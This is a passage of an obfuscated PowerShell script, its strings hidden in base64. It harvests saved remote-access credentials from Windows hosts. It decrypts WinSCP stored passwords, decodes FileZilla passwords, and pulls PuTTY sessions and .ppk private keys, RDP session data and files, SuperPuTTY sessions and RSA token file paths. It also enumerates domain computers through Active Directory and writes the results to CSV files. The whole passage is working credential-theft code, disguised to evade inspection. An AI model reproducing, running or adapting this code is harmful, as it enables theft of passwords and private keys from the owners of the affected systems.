  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA==')))
    ${45} | fl | Out-String
  }
  ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) -Value ${45}
} 
function f25(${f11}) {
  foreach(${26} in ${f11}) {
    ${44} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + ${26}
    ${43} = "" | select -Property Source,Hostname,Username
    ${43}.Source = ${23}
    ${43}.Hostname = (Split-Path ${26} -Leaf)
    ${43}.Username = ((gp -Path ${44} -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) -ErrorAction SilentlyContinue).UsernameHint)
    [void]${42}.Add(${43})
  } 
  if ($o) {
    ${42} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAGUAbQBvAHQAZQAgAEQAZQBzAGsAdABvAHAAIAAoAFIARABQACkAIABTAGUAcwBzAGkAbwBuAHMA')))
    ${42} | fl | Out-String
  }
  ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${42}
} 
function f24(${f10}) {
  foreach(${26} in ${f10}) {
    ${41} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + ${26}
    ${38} = "" | select -Property Source,Session,Hostname,Username,Password
    ${38}.Source = ${23}
    ${38}.Session = (Split-Path ${26} -Leaf)
    ${38}.Hostname = ((gp -Path ${41} -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) -ErrorAction SilentlyContinue).Hostname)
    ${38}.Username = ((gp -Path ${41} -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))) -ErrorAction SilentlyContinue).Username)
    ${38}.Password = ((gp -Path ${41} -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))) -ErrorAction SilentlyContinue).Password)
    if (${38}.Password) {
      ${39} = ((gp -Path (Join-Path ${40}.PSPath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBhAHIAdABpAG4AIABQAHIAaQBrAHIAeQBsAFwAVwBpAG4AUwBDAFAAIAAyAFwAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBcAFMAZQBjAHUAcgBpAHQAeQA=')))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUATQBhAHMAdABlAHIAUABhAHMAcwB3AG8AcgBkAA=='))) -ErrorAction SilentlyContinue).UseMasterPassword)
      if (!${39}) {
          ${38}.Password = (f17 ${38}.Hostname ${38}.Username ${38}.Password)
      } else {
          ${38}.Password = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAHYAZQBkACAAaQBuACAAcwBlAHMAcwBpAG8AbgAsACAAYgB1AHQAIABtAGEAcwB0AGUAcgAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBlAHYAZQBuAHQAcwAgAHAAbABhAGkAbgB0AGUAeAB0ACAAcgBlAGMAbwB2AGUAcgB5AA==')))
      }
    }
    [void]${37}.Add(${38})
  } 
  if ($o) {
    ${37} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA')))
    ${37} | fl | Out-String
  }
  ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${37}
} 
function f23(${f9}) {
  foreach (${31} in ${f9}.VersionInfo.FileName) {
    ${36} = "" | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))
    ${36}."Source" = ${23}
    ${36}."Path" = ${31}
    [void]${35}.Add(${36})
  }
  if (${35}.count -gt 0) {
    ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBkAHQAaQBkACAARgBpAGwAZQBzAA=='))) -Value ${35}
    if ($o) {
      ${35} | select * | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBTAEEAIABUAG8AawBlAG4AcwAgACgAcwBkAHQAaQBkACkA')))
      ${35} | select * | fl | Out-String
    }
  }
} 
function f22(${f8}) {
  foreach (${31} in ${f8}.VersionInfo.FileName) {
    ${34} = "" | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBhAHQAZQB3AGEAeQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AbQBwAHQAcwAgAGYAbwByACAAQwByAGUAZABlAG4AdABpAGEAbABzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAUwBlAHMAcwBpAG8AbgA=')))
    ${34}."Source" = (Hostname)
    ${34}."Path" = ${31}
    ${34}."Hostname" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AGwAbAAgAGEAZABkAHIAZQBzAHMAOgBbAGEALQB6AF0AOgAoAC4AKgApAA==')))).Matches.Groups[1].Value } catch {}
    ${34}."Gateway" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBhAHQAZQB3AGEAeQBoAG8AcwB0AG4AYQBtAGUAOgBbAGEALQB6AF0AOgAoAC4AKgApAA==')))).Matches.Groups[1].Value } catch {}
    ${34}."Administrative Session" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAcwBlAHMAcwBpAG8AbgA6AFsAYQAtAHoAXQA6ACgALgAqACkA')))).Matches.Groups[1].Value } catch {}
    ${34}."Prompts for Credentials" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AbQBwAHQAIABmAG8AcgAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwA6AFsAYQAtAHoAXQA6ACgALgAqACkA')))).Matches.Groups[1].Value } catch {}
    if (!${34}."Administrative Session" -or !${34}."Administrative Session" -eq 0) {
      ${34}."Administrative Session" = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAGUAcwAgAG4AbwB0ACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAGEAZABtAGkAbgAgAHMAZQBzAHMAaQBvAG4AIABvAG4AIAByAGUAbQBvAHQAZQAgAGgAbwBzAHQA')))
    } else {
      ${34}."Administrative Session" = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABzACAAdABvACAAYQBkAG0AaQBuACAAcwBlAHMAcwBpAG8AbgAgAG8AbgAgAHIAZQBtAG8AdABlACAAaABvAHMAdAA=')))
    }
    if (!${34}."Prompts for Credentials" -or ${34}."Prompts for Credentials" -eq 0) {
      ${34}."Prompts for Credentials" = "No"
    } else {
      ${34}."Prompts for Credentials" = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
    }
    [void]${33}.Add(${34})
  }
  if (${33}.count -gt 0) {
    ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABGAGkAbABlAHMA'))) -Value ${33}
    if ($o) {
      ${33} | select * | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABGAGkAbABlAHMAIAAoAC4AcgBkAHAAKQA=')))
      ${33} | select * | fl | Out-String
    }
  }
} 
function f21(${f7}) {
  foreach (${31} in ${f7}.VersionInfo.FileName) {
    ${30} = "" | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARQBuAGMAcgB5AHAAdABpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAEsAZQB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAE0AQQBDAA==')))
    ${30}."Source" = (Hostname)
    ${30}."Path" = ${31}
    ${30}."Protocol" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OgAgACgALgAqACkA'))) -Context 0,0).Matches.Groups[1].Value } catch {}
    ${30}."Private Key Encryption" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAcgB5AHAAdABpAG8AbgA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {}
    ${30}."Comment" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {}
    ${32} = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAEwAaQBuAGUAcwA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {}
    ${30}."Private Key" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAEwAaQBuAGUAcwA6ACAAKAAuACoAKQA='))) -Context 0,${32}).Context.PostContext -Join "" } catch {}
    ${30}."Private MAC" = try { (sls -Path ${31} -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAE0AQQBDADoAIAAoAC4AKgApAA==')))).Matches.Groups[1].Value } catch {}
    [void]${29}.Add(${30})
  }
  if (${29}.count -gt 0) {
    ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABQAEsAIABGAGkAbABlAHMA'))) -Value ${29}
    if ($o) {
      ${29} | select * | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
    } else {
      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARgBpAGwAZQBzACAAKAAuAHAAcABrACkA')))
      ${29} | select * | fl | Out-String
    }
  }
} 
function f20(${f6}) {
  foreach(${28} in ${f6}.SelectNodes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwAvAEYAaQBsAGUAWgBpAGwAbABhADMALwBTAGUAcgB2AGUAcgBzAC8AUwBlAHIAdgBlAHIA'))))) {
      ${27} = @{}
      ${28}.ChildNodes | % {
          ${27}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA')))] = ${23}
          if ($_.InnerText) {
              if ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwA=')))) {
                  ${27}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))] = $_.InnerText
              } else {
                  ${27}[$_.Name] = $_.InnerText
              }
          }
      }
    [void]${25}.Add((New-Object PSObject -Property ${27} | select -Property * -ExcludeProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IwB0AGUAeAB0AA=='))),LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
  } 
  foreach (${26} in ${25}) {
      ${26}.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${26}.Password))
      if (${26}.Protocol -eq "0") {
        ${26}.Protocol = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABGAFQAUAAgAG8AdgBlAHIAIABUAEwAUwAgAGkAZgAgAGEAdgBhAGkAbABhAGIAbABlAA==')))
      } elseif (${26}.Protocol -eq 1) {
        ${26}.Protocol = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABTAEYAVABQAA==')))
      } elseif (${26}.Protocol -eq 3) {
        ${26}.Protocol = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBpAHIAZQAgAGkAbQBwAGwAaQBjAGkAdAAgAEYAVABQACAAbwB2AGUAcgAgAFQATABTAA==')))
      } elseif (${26}.Protocol -eq 4) {
        ${26}.Protocol = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBpAHIAZQAgAGUAeABwAGwAaQBjAGkAdAAgAEYAVABQACAAbwB2AGUAcgAgAFQATABTAA==')))
      } elseif (${26}.Protocol -eq 6) {
        ${26}.Protocol = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGwAeQAgAHUAcwBlACAAcABsAGEAaQBuACAARgBUAFAAIAAoAGkAbgBzAGUAYwB1AHIAZQApAA==')))
      }
  }
  if ($o) {
    ${25} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABGAGkAbABlAFoAaQBsAGwAYQAuAGMAcwB2AA==')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBaAGkAbABsAGEAIABTAGUAcwBzAGkAbwBuAHMA')))
    ${25} | fl | Out-String
  }
  ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBaAGkAbABsAGEAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${25}
} 
function f19(${f5}) {
  foreach(${24} in ${f5}.ArrayOfSessionData.SessionData) {
    foreach (${22} in ${24}) {
      if (${22} -ne $null) {
        ${21} = "" | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEEAcgBnAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHIAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQAdAB5ACAAUwBlAHMAcwBpAG8AbgA=')))
        ${21}."Source" = ${23}
        ${21}."SessionId" = ${22}.SessionId
        ${21}."SessionName" = ${22}.SessionName
        ${21}."Host" = ${22}.Host
        ${21}."Username" = ${22}.Username
        ${21}."ExtraArgs" = ${22}.ExtraArgs
        ${21}."Port" = ${22}.Port
        ${21}."PuTTY Session" = ${22}.PuttySession
        [void]${18}.Add(${21})
      }
    }
  } 
  if ($o) {
    ${18} | Export-CSV -Append -Path (${20} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHUAcABlAHIAUAB1AFQAVABZAC4AYwBzAHYA')))) -NoTypeInformation
  } else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAFAAdQBUAFQAWQAgAFMAZQBzAHMAaQBvAG4AcwA=')))
    ${18} | Out-String
  }
  ${19} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAFAAdQBUAFQAWQAgAFMAZQBzAHMAaQBvAG4AcwA='))) -Value ${18}
} 
function f18 {
  ${16} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
  ${17} = New-Object System.DirectoryServices.DirectoryEntry
  ${14} = New-Object System.DirectoryServices.DirectorySearcher
  ${14}.SearchRoot = ${17}
  ${14}.Filter = ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQAkAHsAMQA2AH0AKQA='))))
  ${15} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA=')))
  foreach (${6} in ${15}){${14}.PropertiesToLoad.Add(${6})}
  return ${14}.FindAll()
}
function f16(${f4}) {
  ${9} = "" | select -Property flag,remainingPass
  ${13} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADIAMwA0ADUANgA3ADgAOQBBAEIAQwBEAEUARgA='))).indexOf(${f4}[0]) * 16)
  ${12} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADIAMwA0ADUANgA3ADgAOQBBAEIAQwBEAEUARgA='))).indexOf(${f4}[1])
  ${11} = ${13} + ${12}
  ${10} = (((-bnot (${11} -bxor ${8})) % 256) + 256) % 256
  ${9}.flag = ${10}
  ${9}.remainingPass = ${f4}.Substring(2)
  return ${9}
}
function f17(${f3}, ${f2}, ${f1}) {
  ${3} = 255
  ${8} = 163
  ${7} = 0
  ${2} =  ${f3} + ${f2}
  ${5} = f16(${f1})
  ${4} = ${5}.flag
  if (${5}.flag -eq ${3}) {
    ${5}.remainingPass = ${5}.remainingPass.Substring(2)
    ${5} = f16(${5}.remainingPass)
  }
  ${7} = ${5}.flag
  ${5} = f16(${5}.remainingPass)
  ${5}.remainingPass = ${5}.remainingPass.Substring((${5}.flag * 2))
  ${1} = ""
  for (${6}=0; ${6} -lt ${7}; ${6}++) {
    ${5} = (f16(${5}.remainingPass))
    ${1} += [char]${5}.flag
  }
  if (${4} -eq ${3}) {
    return ${1}.Substring(${2}.length)
  }
  return ${1}
}
